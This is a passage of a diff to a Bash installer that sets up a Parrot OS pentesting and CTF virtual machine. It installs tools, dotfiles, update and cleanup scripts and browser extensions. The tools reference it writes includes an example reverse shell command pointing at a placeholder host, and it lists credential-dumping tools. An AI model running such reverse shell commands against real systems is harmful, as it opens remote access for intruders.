-  cat > $USER_HOME/.vimrc << 'VIM_EOF'
-" Basic settings
-set number
-set relativenumber
-set tabstop=4
-set shiftwidth=4
-set expandtab
-set autoindent
-set smartindent
-set hlsearch
-set incsearch
-set ignorecase
-set smartcase
-set showmatch
-set wildmenu
-set wildmode=longest:full,full
-set clipboard=unnamedplus
-
-" Syntax highlighting
-syntax on
-filetype plugin indent on
-
-" Color scheme
-colorscheme desert
-set background=dark
-
-" Status line
-set laststatus=2
-set statusline=%F%m%r%h%w\ [%l,%c]\ [%L\ lines]
-
-" Enable mouse
-set mouse=a
-
-" Leader key
-let mapleader = ","
-
-" Quick save
-nnoremap <leader>w :w<CR>
-
-" Quick quit
-nnoremap <leader>q :q<CR>
-VIM_EOF
-
-  # Create CTF Tools Reference on Desktop
-  log_info "Creating comprehensive tool reference guide"
-  CREATION_DATE=$(date '+%Y-%m-%d %H:%M:%S %Z')
- 
-  cat > $USER_HOME/Desktop/CTF_TOOLS_REFERENCE.txt << TOOLS_EOF
-
-          PARROT PENTESTING TOOLKIT REFERENCE
-             Modern 2025 Edition
-
-
-POWER USER COMMAND LINE REPLACEMENTS
-
-
-eza (Alias: ls, ll)
- Modern, Rust-based replacement for 'ls'.
- Features: Git status integration, colorized output, tree view.
- Usage: ll (for detailed view), eza -T (for tree view)
-
-zoxide (Alias: z)
- Smarter 'cd' command. Learns your habits to jump quickly to frequently accessed folders.
- Usage: z <keyword> (e.g., 'z engage' to jump to engagements directory)
-
-btop (Alias: top)
- Modern, graphical, and feature-rich replacement for 'htop'/'top'.
- Usage: btop (monitor CPU, memory, processes, network in a TUI)
-
-bat
- 'cat' clone with syntax highlighting, Git integration, and auto-pagination (via less).
- Usage: bat <file> (automatically highlights code/config files)
-
-httpie (Alias: http)
- User-friendly cURL replacement for web/API testing.
- Usage: http POST http://target/api/user name=jamie
-
-yq
- Command-line processor for YAML, TOML, and XML. Acts like 'jq' for non-JSON config files.
- Usage: yq '.config.user' config.yml
-
-
-RECONNAISSANCE & ENUMERATION
-
-
-PORT SCANNING
-nmap
- Network exploration and security auditing
-naabu
- Fast port scanner (ProjectDiscovery)
-
-SUBDOMAIN ENUMERATION
-subfinder
- Fast passive subdomain discovery (ProjectDiscovery)
-dnsx
- DNS toolkit with bruteforcing (ProjectDiscovery)
-
-WEB ENUMERATION
-httpx
- HTTP toolkit with tech detection (ProjectDiscovery)
-katana
- Next-generation web crawler (ProjectDiscovery)
-nuclei
- Vulnerability scanner with templates (ProjectDiscovery)
-ffuf
- Fast web fuzzer
-
-
-WINDOWS / ACTIVE DIRECTORY
-
-
-CREDENTIAL ATTACKS
-netexec (nxc)
- Modern CrackMapExec replacement - Swiss Army knife for AD
-
-Impacket Suite (Aliases installed: 'secretsdump', 'psexec', 'getnpusers', etc.)
- All tools work WITHOUT the 'impacket-' OR the '.py' suffix!
- 
- getnpusers
-  AS-REP roasting
- 
- secretsdump
-  Dump credentials from various sources
-
-ENUMERATION
-bloodhound-python
- Active Directory relationship mapper
-
-
-PIVOTING & TUNNELING
-
-
-chisel
- Fast TCP/UDP tunnel over HTTP
-
-proxychains4
- Route traffic through SOCKS/HTTP proxies
-
-xfreerdp
- RDP client for connecting to Windows systems
-
-
-POST-EXPLOITATION & REVERSE SHELLS
-
-
-Penelope (Alias: shell) ⭐ RECOMMENDED
- Advanced shell handler with auto-upgrade to PTY, file transfer, and port forwarding
- Usage: shell 4444
- Location: ~/penelope.py
- Features:
-  - Auto-upgrade shells to PTY
-  - Tab completion & command history
-  - Upload/download files
-  - Multiple session management
-  - Port forwarding
-  - Session logging
- Example target command:
-  bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
-
-rlwrap nc (Alias: rl)
- Netcat with readline support (history/editing)
- Usage: rl -lvnp 4444
- Quick and simple for basic shells
-
-netcat (nc)
- Classic TCP/UDP swiss army knife
- Usage: nc -lvnp 4444
- Minimal but reliable
-
-
-PASSWORD CRACKING & HASH ID
-
-
-hashid (Alias: hash)
- The primary Python tool for identifying hash types (with Hashcat/JtR modes).
- Usage: hash "32ed87bd5fdc5e204e2620a05a069858"
-
-haiti
- Secondary, modern Ruby-based hash identifier.
- Usage: haiti "32ed87bd5fdc5e204e2620a05a069858"
-
-hashcat
- GPU-accelerated password cracking
- Mode lookup: Use hashid -m to find the correct mode number.
-
-john
- CPU password cracking (John the Ripper)
-
-
-BINARY EXPLOITATION
-
-
-pwndbg / gdb
- Enhanced debugger. Use 'pwn' alias to start.
-
-radare2
- Full command-line reverse engineering framework.
- Usage: radare2 -w -A ./binary
-
-one_gadget
- Find the "one gadget" RCE offsets in libc
-
-
-CTF / FORENSICS / STEGANOGRAPHY
-
-
-binwalk
- Firmware/File analysis and extraction tool
-
-exiftool
- Read and write meta information in files
-
-steghide
- Hide/extract data in JPEG/BMP/WAV/AU files
-
-foremost
- File carving tool (recover files from raw data)
-
-RsaCtfTool / featherduster
- Automated cryptography and cipher attack tools.
-
-
-TIPS & TRICKS
-
-
- Use **zoxide (z)** to jump directories: `z <keyword>`
- Use **eza (ls)** for colored/git-integrated file listings.
- Use **btop (top)** to monitor system performance.
- Use **httpie (http)** instead of curl for quick API testing.
- **REVERT_CTF_CHANGES.sh** on the Desktop archives engagement data and resets host files.
-
-
-
-Tool Stack Version: 2.4 (Current Production - Ultimate Power User/CTF)
-Last updated: ${CREATION_DATE}
-
-TOOLS_EOF
-
-  # Create VirtualBox Guest Additions installation guide
-  log_info "Creating VirtualBox Guest Additions installation guide"
-  cat > $USER_HOME/Desktop/VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt << 'VBOX_EOF'
-
-     Installing VirtualBox Guest Additions on Parrot OS       
-          (Debian 12 "Bookworm"-based)             
-
-
-This guide will help you install VirtualBox Guest Additions to enable:
-  Shared clipboard (copy/paste between host and VM)
-  Drag and drop files
-  Shared folders
-  Better screen resolution and scaling
-  Improved mouse integration
-
-
-STEP 1: Insert the Guest Additions ISO
-
-
-On your Windows host:
- 1. Open VirtualBox Manager
- 2. Select your Parrot VM  Settings  Storage
- 3. Under the CD drive (IDE or SATA), click the disc icon
- 4. Choose "Insert Guest Additions CD image..."
-  OR manually select:
-  C:\Program Files\Oracle\VirtualBox\VBoxGuestAdditions.iso
-
-
-STEP 2: Mount the ISO in the Parrot guest
-
-
-Run these commands in your Parrot VM terminal:
-
-sudo mkdir -p /mnt/cdrom
-sudo mount /dev/cdrom /mnt/cdrom
-
-Expected output:
- mount: /mnt/cdrom: WARNING: source write-protected, mounted read-only.
-
- This warning is NORMAL and OK to ignore  CD-ROMs are read-only by nature.
-
-
-STEP 3: Verify the ISO contents
-
-
-ls /mnt/cdrom
-
-You should see files like:
-  VBoxLinuxAdditions.run
-  VBoxWindowsAdditions.exe
-  autorun.sh
-  AUTORUN.INF
-
-
-STEP 4: Install required build tools
-
-
-sudo apt update
-sudo apt install -y build-essential dkms linux-headers-$(uname -r)
-
-This installs:
-  build-essential: Compilers and build tools
-  dkms: Dynamic Kernel Module Support
-  linux-headers: Kernel headers for your current kernel
-
-
-STEP 5: Run the Guest Additions installer
-
-
-cd /mnt/cdrom
-sudo sh ./VBoxLinuxAdditions.run
-
-Expected output:
- Verifying archive integrity... 100% MD5 checksums are OK. All good.
- Uncompressing VirtualBox X.X.X Guest Additions for Linux...
- VirtualBox Guest Additions: Starting.
- VirtualBox Guest Additions: Building the VirtualBox Guest Additions kernel
- modules. This may take a while.
- VirtualBox Guest Additions: To build modules for other installed kernels, run
- VirtualBox Guest Additions: /sbin/rcvboxadd quicksetup <version>
- VirtualBox Guest Additions: or
- VirtualBox Guest Additions: /sbin/rcvboxadd quicksetup all
- VirtualBox Guest Additions: Building the modules for kernel X.X.X-X-amd64.
- VirtualBox Guest Additions: Running kernel modules will not be replaced until
- the system is restarted
- VirtualBox Guest Additions: kernel modules and services X.X.X loaded
-
- You may see repeated errors like:
- libkmod: ERROR ../libkmod/libkmod-config.c:772 conf_files_filter_out:
- Directories inside directories are not supported: /etc/modprobe.d/virtualbox-dkms.conf
-
-These errors are OK to ignore unless they interfere with system behavior.
-They occur when there's a directory where a config file is expected.
-
-
-STEP 6: Reboot the VM
-
-
-sudo reboot
-
-After reboot, Guest Additions should be active and you'll have:
-  Shared clipboard
-  Drag and drop
-  Better resolution scaling
-  Seamless mouse integration
-
-
-TROUBLESHOOTING
-
-
-If clipboard sharing doesn't work after reboot:
- 1. Verify Guest Additions are running:
-  lsmod | grep vbox
-
-  You should see modules like:
-   vboxguest
-   vboxsf
-   vboxvideo
-
- 2. Check VirtualBox settings:
-  VM Settings  General  Advanced
-  - Shared Clipboard: Bidirectional
-  - Drag'n'Drop: Bidirectional
-
- 3. Restart the VBoxClient services:
-  killall VBoxClient
-  VBoxClient --clipboard &
-  VBoxClient --draganddrop &
-  VBoxClient --seamless &
-
-If kernel modules fail to build:
-  Ensure you have the correct kernel headers:
-  sudo apt install linux-headers-$(uname -r)
-
-  Try rebuilding:
-  sudo /sbin/rcvboxadd setup
-
-If screen resolution is wrong:
-  Right-click desktop  Display Settings
-  Or use VirtualBox: View  Auto-resize Guest Display
-
-
-SETTING UP SHARED FOLDERS (Optional)
-
-
-1. On Windows host:
- VM Settings  Shared Folders  Add new shared folder
- Folder Path: C:\Users\YourName\Desktop (or wherever)
- Folder Name: shared (or any name you want)
-  Auto-mount
-  Make Permanent
-
-2. In Parrot VM, add your user to vboxsf group:
- sudo usermod -aG vboxsf jamie
- 
-3. Reboot or log out/in
-
-4. Access shared folder at:
- /media/sf_shared (or whatever name you chose)
-
-
-QUICK REFERENCE COMMANDS
-
-
-Mount CD:
- sudo mount /dev/cdrom /mnt/cdrom
-
-Install:
- cd /mnt/cdrom && sudo sh ./VBoxLinuxAdditions.run
-
-Check if running:
- lsmod | grep vbox
-
-Restart services:
- killall VBoxClient && VBoxClient --clipboard &
-
-Rebuild modules:
- sudo /sbin/rcvboxadd setup
-
-
-VBOX_EOF
-
-  # Fix ownership of all dotfiles
-  chown -R jamie:jamie $USER_HOME
- 
-  log_info "Phase 5 complete"
-  log_progress "Phase 5/8:  Complete"
-}
-
-# ============================================
-# PHASE 6: Automation & Maintenance Scripts
-# ============================================
-phase6_automation_setup() {
-  show_progress 6
-  log_progress "Phase 6/8: Automation & Maintenance Scripts..."
-  log_info "Phase 6: Setting up automation scripts"
- 
-  sudo -u jamie mkdir -p $USER_HOME/scripts
- 
-  # Tool update script
-  cat > $USER_HOME/scripts/update-tools.sh << 'EOF'
+  
+  chown "$USERNAME":"$USERNAME" $USER_HOME/.zshrc
+  
+  # Create update script
+  log_progress "Creating update-tools script..."
+  cat > $USER_HOME/scripts/update-tools.sh << 'UPDATE_EOF'
 #!/bin/bash
 # Update all pentesting tools
 
 echo "[+] Updating system packages..."
 sudo apt update && sudo apt upgrade -y
 
-echo "[+] Updating Python tools (pip3)..."
-# All pip tools are included here
+echo "[+] Updating Python tools..."
 pip3 install --upgrade --break-system-packages \
-  impacket bloodhound bloodyAD mitm6 certipy-ad truffleHog pwntools ROPgadget \
-  hashid RsaCtfTool featherduster || true
-
-echo "[+] Updating system packages (apt)..."
-# All APT tools are included here
-sudo apt update
-sudo apt upgrade -y \
-  sqlmap hashcat john theharvester cewl gdb wpscan steghide zsteg binwalk foremost exiftool p7zip-full radare2 \
-  zoxide eza btop httpie yq || true
+  impacket bloodhound bloodyAD certipy-ad pypykatz lsassy pwntools ROPgadget truffleHog || true
 
 echo "[+] Updating Go tools..."
-# All Go tools are included here
 go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
 go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
 go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
 go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-go install -v github.com/projectdiscovery/katana/cmd/katana@latest
-go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
 go install -v github.com/ffuf/ffuf@latest
 go install -v github.com/OJ/gobuster/v3@latest
 go install -v github.com/jpillora/chisel@latest
 go install -v github.com/zricethezav/gitleaks/v8@latest
-go install -v github.com/ropnop/kerbrute@latest || true
 
-echo "[+] Updating Ruby tools (one_gadget, haiti)..."
+echo "[+] Updating Ruby tools..."
 gem update one_gadget haiti-hash || true
 
 echo "[+] Updating Nuclei templates..."
 nuclei -update-templates
-
-echo "[+] Updating ysoserial..."
-wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ~/tools/ysoserial.jar 2>/dev/null || echo "[-] Failed to update ysoserial"
 
 echo "[+] Updating repositories..."
 cd ~/tools/repos
@@ -1052,320 +1266,143 @@ cd ~/tools/wordlists/SecLists
 git pull
 
 echo "[+] All tools updated!"
-EOF
- 
+UPDATE_EOF
+  
   chmod +x $USER_HOME/scripts/update-tools.sh
- 
-  # --- REVERT & ARCHIVE SCRIPT ---
-  log_progress "Creating CTF environment revert and archive script..."
-  cat > $USER_HOME/scripts/revert-ctf-changes.sh << 'REVERT_EOF'
-#!/bin/bash
-# CTF Environment Revert & Archive Script
-# Archives engagement data and cleans up common artifacts left over from HTB/CTF engagements.
-
-set -e
-
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-NC='\033[0m'
-
-log_revert_info() {
-  echo -e "${GREEN}[*]${NC} $1"
-}
-log_revert_warn() {
-  echo -e "${YELLOW}[!]${NC} $1"
-}
-
-# 1. Reset Host & DNS Files
-reset_network_config() {
-  log_revert_info "1. Resetting /etc/hosts, /etc/resolv.conf, and Kerberos config..."
- 
-  # a) Reset /etc/hosts to default loopback entries
-  if [ -w /etc/hosts ]; then
-    echo -e "127.0.0.1\tlocalhost\n127.0.1.1\tparrot" | sudo tee /etc/hosts > /dev/null
-    log_revert_info " -> /etc/hosts reverted."
-  else
-    log_revert_warn " -> Cannot write to /etc/hosts. Skipping."
-  fi
- 
-  # b) Reset /etc/resolv.conf to standard Google/Cloudflare DNS
-  if [ -w /etc/resolv.conf ]; then
-    echo -e "nameserver 127.0.0.1\nnameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf > /dev/null
-    log_revert_info " -> /etc/resolv.conf reset."
-  else
-    log_revert_warn " -> Cannot write to /etc/resolv.conf. Skipping."
-  fi
- 
-  # c) Clear Kerberos configuration
-  if [ -f /etc/krb5.conf.default ]; then
-    sudo cp /etc/krb5.conf.default /etc/krb5.conf
-    log_revert_info " -> /etc/krb5.conf reverted."
-  else
-    log_revert_warn " -> Default Kerberos config not found. Skipping /etc/krb5.conf."
-  fi
-}
-
-# 2. Clear Residual Credentials and Tickets
-clear_credentials() {
-  log_revert_info "2. Clearing residual session data..."
- 
-  # a) Clear Kerberos ticket cache
-  if klist &>/dev/null; then
-    kdestroy -A 2>/dev/null
-    log_revert_info " -> Kerberos tickets destroyed."
-  fi
- 
-  # b) Clear user-specific temp folders where tokens might be stored
-  find $HOME/ -type f -name "*.token" -delete 2>/dev/null
-  log_revert_info " -> Temporary token files deleted from home directory."
- 
-  # c) Clear ssh-agent identities
-  if ssh-add -l &>/dev/null; then
-    ssh-add -D 2>/dev/null
-    log_revert_info " -> SSH identities cleared from ssh-agent."
-  fi
-}
-
-# 3. Archive engagement-specific data and clean up workspace
-cleanup_workspace() {
-  log_revert_info "3. Archiving engagement data and cleaning workspace..."
- 
-  local ENGAGEMENTS_DIR="$HOME/engagements"
-  local BACKUP_DIR="$HOME/backups"
-  local TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-  local ARCHIVE_NAME="engagement_archive_${TIMESTAMP}.tar.gz"
-
-  mkdir -p $BACKUP_DIR
- 
-  # a) Archive and move engagements directory
-  if [ -d "$ENGAGEMENTS_DIR" ] && [ "$(ls -A $ENGAGEMENTS_DIR)" ]; then
-    echo ""
-    log_revert_warn "!!! WARNING: About to zip and move the contents of $ENGAGEMENTS_DIR"
-    read -r -p "Do you want to archive and clear the engagement data? (yes/no): " confirmation
-    if [[ "$confirmation" =~ ^(yes|y)$ ]]; then
-      # Create archive
-      tar -czf $BACKUP_DIR/$ARCHIVE_NAME -C $ENGAGEMENTS_DIR .
-      log_revert_info " -> Engagements successfully archived to $BACKUP_DIR/$ARCHIVE_NAME"
-      
-      # Clear the live engagements directory
-      rm -rf $ENGAGEMENTS_DIR/*
-      log_revert_info " -> $ENGAGEMENTS_DIR cleared for the next CTF."
-    else
-      log_revert_warn " -> Engagement data preserved. $ENGAGEMENTS_DIR NOT cleared."
-    fi
-  else
-    log_revert_info " -> $ENGAGEMENTS_DIR is empty or not found. Skipping archive."
-  fi
- 
-  # b) Clear common temporary directories
-  log_revert_info " -> Clearing common temporary directories (e.g., /tmp, /dev/shm)..."
-  sudo rm -rf /tmp/* /dev/shm/* $HOME/.cache/* 2>/dev/null || true
-}
-
-# 4. Final System Polish
-final_polish() {
-  log_revert_info "4. Final System Polish..."
- 
-  # Clear Zsh history
-  history -c
-  history -w
-  log_revert_info " -> Shell history cleared for current session."
- 
-  log_revert_info "Script finished! A reboot is recommended for a clean state."
-}
-
-# --- Main Execution ---
-echo -e "${RED}${NC}"
-echo -e "${RED}       CTF ENVIRONMENT REVERT & ARCHIVE    ${NC}"
-echo -e "${RED}${NC}"
-log_revert_warn "This script requires 'sudo' privileges for network changes."
-read -r -p "Press Enter to begin the revert process (Ctrl+C to cancel)..."
-
-reset_network_config
-clear_credentials
-cleanup_workspace
-final_polish
-
-REVERT_EOF
- 
-  chmod +x $USER_HOME/scripts/revert-ctf-changes.sh
-  sudo -u jamie ln -sf $USER_HOME/scripts/revert-ctf-changes.sh $USER_HOME/Desktop/REVERT_CTF_CHANGES.sh 2>/dev/null || true
-  log_info "Revert/Archive script created: ~/scripts/revert-ctf-changes.sh"
-  log_info "Desktop symlink created: ~/Desktop/REVERT_CTF_CHANGES.sh"
-
-  # Quick backup script
-  cat > $USER_HOME/scripts/backup-engagement.sh << 'EOF'
-#!/bin/bash
-# Backup engagement folder
-
-if [ -z "$1" ]; then
-  echo "Usage: backup-engagement.sh <engagement-name>"
-  exit 1
-fi
-
-BACKUP_DIR=~/backups
-mkdir -p $BACKUP_DIR
-
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-tar -czf $BACKUP_DIR/$1_$TIMESTAMP.tar.gz ~/engagements/$1/
-
-echo "[+] Backup created: $BACKUP_DIR/$1_$TIMESTAMP.tar.gz"
-EOF
- 
-  chmod +x $USER_HOME/scripts/backup-engagement.sh
-  chown -R jamie:jamie $USER_HOME/scripts
-  chown jamie:jamie $USER_HOME/Desktop/REVERT_CTF_CHANGES.sh
- 
-  log_info "Phase 6 complete"
-  log_progress "Phase 6/8:  Complete"
+  chown -R "$USERNAME":"$USERNAME" $USER_HOME/scripts
+  
+  log_info "✓ Automation & dotfiles setup complete"
 }
 
 # ============================================
-# PHASE 7: Firefox Extensions for Web Enumeration
+# FINAL CLEANUP
 # ============================================
-phase7_firefox_extensions() {
-  show_progress 7
-  log_progress "Phase 7/8: Firefox Extensions for CTF/Web Enumeration..."
-  log_info "Phase 7: Installing Firefox extensions"
- 
-  # Find Firefox profile directory for jamie
-  FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
- 
-  if [ -z "$FIREFOX_PROFILE" ]; then
-    log_warn "Firefox profile not found. Starting Firefox once to create profile..."
-    # Start Firefox as jamie briefly to create profile
-    sudo -u jamie timeout 5 firefox --headless 2>/dev/null || true
-    sleep 2
-    FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
-  fi
- 
-  if [ -n "$FIREFOX_PROFILE" ]; then
-    log_info "Firefox profile found: $FIREFOX_PROFILE"
-   
-    # Create extensions directory
-    sudo -u jamie mkdir -p "$FIREFOX_PROFILE/extensions"
-   
-    # Download and install extensions
-    log_progress "Installing FoxyProxy Standard (proxy management)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/foxyproxy@eric.h.jung.xpi" 2>/dev/null || log_warn "Failed to download FoxyProxy"
-   
-    log_progress "Installing Dark Reader (dark mode for all sites)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/addon@darkreader.org.xpi" 2>/dev/null || log_warn "Failed to download Dark Reader"
-   
-    log_progress "Installing Cookie-Editor (cookie management)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-e4e2c0b560e0}.xpi" 2>/dev/null || log_warn "Failed to download Cookie-Editor"
-   
-    log_progress "Installing Wappalyzer (technology detection)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/wappalyzer@crunchlabs.com.xpi" 2>/dev/null || log_warn "Failed to download Wappalyzer"
-   
-    log_progress "Installing Hack-Tools (web pentest toolkit)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/hacktools/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-hacktools}.xpi" 2>/dev/null || log_warn "Failed to download Hack-Tools"
-   
-    log_progress "Installing User-Agent Switcher (modify user agent)..."
-    sudo -u jamie wget -q "https://addons.mozilla.org/firefox/downloads/latest/user-agent-string-switcher/latest.xpi" \
-      -O "$FIREFOX_PROFILE/extensions/user-agent-switcher@ninetailed.ninja.xpi" 2>/dev/null || log_warn "Failed to download User-Agent Switcher"
-   
-    log_info "Firefox extensions installed. They will be available after Firefox restart."
-    log_info "Installed extensions:"
-    log_info " - FoxyProxy Standard: Proxy management for Burp"
-    log_info " - Dark Reader: Dark mode for web enumeration"
-    log_info " - Cookie-Editor: Easy cookie editing"
-    log_info " - Wappalyzer: Detect technologies on websites"
-    log_info " - Hack-Tools: Reverse shells, payloads, etc."
-    log_info " - User-Agent Switcher: Change browser UA"
-  else
-    log_warn "Could not find or create Firefox profile. Extensions will need to be installed manually."
-  fi
- 
-  log_info "Phase 7 complete"
-  log_progress "Phase 7/8:  Complete"
-}
-
-# ============================================
-# PHASE 8: Post-Install Cleanup
-# ============================================
-phase8_cleanup() {
-  show_progress 8
-  log_progress "Phase 8/8: Post-Install Cleanup..."
-  log_info "Phase 8: Cleaning up and finalizing"
- 
-  # Clean apt cache
+phase_final_cleanup() {
+  log_progress "Phase: Final Cleanup"
+  
   log_progress "Removing unnecessary packages..."
-  DEBIAN_FRONTEND=noninteractive apt autoremove -y
- 
+  DEBIAN_FRONTEND=noninteractive apt autoremove -y -qq 2>&1 | tee -a /var/log/ctfbox-install.log
+  
   log_progress "Cleaning package cache..."
-  DEBIAN_FRONTEND=noninteractive apt autoclean -y
- 
-  log_info "Phase 8 complete"
-  log_progress "Phase 8/8:  Complete"
+  DEBIAN_FRONTEND=noninteractive apt autoclean -y -qq 2>&1 | tee -a /var/log/ctfbox-install.log
+  
+  # Fix ownership
+  chown -R "$USERNAME":"$USERNAME" $USER_HOME
+  
+  log_info "✓ Cleanup complete"
 }
 
 # ============================================
-# Main Execution
+# COMPLETION MESSAGE
 # ============================================
-main() {
+show_completion_message() {
+  clear
+  echo -e "${GREEN}"
   cat << "EOF"
-
- Parrot Security VM Enhancement Script     
- Fresh install  Fully loaded pentesting box  
- Modern 2025 Edition (Fixed)          
-
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║              ✓ INSTALLATION COMPLETE!                        ║
+║                                                               ║
+╚═══════════════════════════════════════════════════════════════╝
 EOF
- 
-  log_info "Starting installation..."
-  log_info "This will take 10-20 minutes depending on your connection"
-  sleep 2
- 
-  phase1_system_setup
-  phase2_user_setup
-  phase3_shell_setup
-  phase4_tools_setup
-  phase5_dotfiles_setup
-  phase6_automation_setup
-  phase7_firefox_extensions
-  phase8_cleanup
- 
-  cat << EOF
-
-
-       Installation Complete!       
-
-
-User 'jamie' created with full sudo privileges (no password required)
-
-Next steps:
-1. REBOOT the VM: sudo reboot
-2. Log in as 'jamie' (auto-login configured)
-3. Powerlevel10k theme is pre-configured (no wizard needed!)
-4. Run '~/scripts/update-tools.sh' to update everything
-5. Create an engagement: newengagement <name>
-
-Useful commands:
- - newengagement <name>  : Create new engagement folder
- - quickscan <target>   : Quick nmap scan
- - shell <port>      : Start Penelope reverse shell handler (e.g., shell 4444)
- - z <keyword>      : Jump to any directory instantly (zoxide)
- - ll           : Modern file listing (eza)
- - top          : System monitor (btop)
- - http          : Modern cURL replacement (httpie)
- - **REVERT_CTF_CHANGES.sh**: Archives engagement data and resets host files.
-
-Tool reference guide on Desktop: CTF_TOOLS_REFERENCE.txt
-VirtualBox setup guide on Desktop: VIRTUALBOX_GUEST_ADDITIONS_INSTALL.txt
-
-Happy hacking!
-EOF
- 
-  log_warn "System will reboot in 10 seconds (Hit Ctrl+C to cancel)..."
+  echo -e "${NC}"
+  
+  echo ""
+  echo -e "${GREEN}User '${USERNAME}' created with full sudo privileges${NC}"
+  echo ""
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo -e "${CYAN}NEXT STEPS:${NC}"
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo ""
+  echo "1. REBOOT the VM: ${YELLOW}sudo reboot${NC}"
+  echo "2. Log in as '${USERNAME}'"
+  echo "3. Run: ${YELLOW}~/scripts/update-tools.sh${NC} (to update everything)"
+  echo "4. Create an engagement: ${YELLOW}newengagement <name>${NC}"
+  echo ""
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo -e "${CYAN}USEFUL COMMANDS:${NC}"
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo ""
+  echo " ${GREEN}•${NC} newengagement <name>  : Create new engagement folder"
+  echo " ${GREEN}•${NC} quickscan <target>    : Quick nmap scan"
+  echo " ${GREEN}•${NC} shell <port>          : Start Penelope reverse shell handler"
+  echo " ${GREEN}•${NC} z <keyword>           : Jump to directory (zoxide)"
+  echo " ${GREEN}•${NC} ll                    : Modern file listing (eza)"
+  echo " ${GREEN}•${NC} top                   : System monitor (btop)"
+  echo " ${GREEN}•${NC} http                  : Modern cURL (httpie)"
+  echo ""
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo ""
+  echo -e "${YELLOW}Installation log saved to: /var/log/ctfbox-install.log${NC}"
+  echo ""
+  echo -e "${GREEN}Happy Hacking! 🏴‍☠️${NC}"
+  echo ""
+  
+  log_warn "System will reboot in 10 seconds (Ctrl+C to cancel)..."
   sleep 10
   reboot
 }
 
-# Run it
-main
+# ============================================
+# MAIN EXECUTION
+# ============================================
+main() {
+  # Check if running as root
+  if [ "$EUID" -ne 0 ]; then
+    log_error "This script must be run as root (use sudo)"
+    exit 1
+  fi
+  
+  # Parse command-line arguments
+  while [[ $# -gt 0 ]]; do
+    case $1 in
+      --user=*)
+        CLI_USERNAME="${1#*=}"
+        shift
+        ;;
+      -u)
+        CLI_USERNAME="$2"
+        shift 2
+        ;;
+      --full)
+        install_full
+        exit 0
+        ;;
+      --help|-h)
+        echo "CTF Box Installer v${SCRIPT_VERSION}"
+        echo "Usage: $0 [OPTIONS]"
+        echo ""
+        echo "Options:"
+        echo "  --user=<username>, -u <username>  Set username"
+        echo "  --full                            Run full installation"
+        echo "  --help, -h                        Show this help"
+        echo ""
+        exit 0
+        ;;
+      *)
+        log_error "Unknown option: $1"
+        echo "Use --help for usage information"
+        exit 1
+        ;;
+    esac
+  done
+  
+  # Set username from CLI if provided
+  if [[ -n "$CLI_USERNAME" ]]; then
+    if validate_username "$CLI_USERNAME"; then
+      USERNAME="$CLI_USERNAME"
+      USER_HOME="/home/$USERNAME"
+      export USERNAME USER_HOME
+    else
+      log_error "Invalid username provided via command line"
+      exit 1
+    fi
+  fi
+  
+  # Show welcome screen and start menu
+  welcome_screen
+  show_main_menu
+}
+
+# Run the installer
+main "$@"
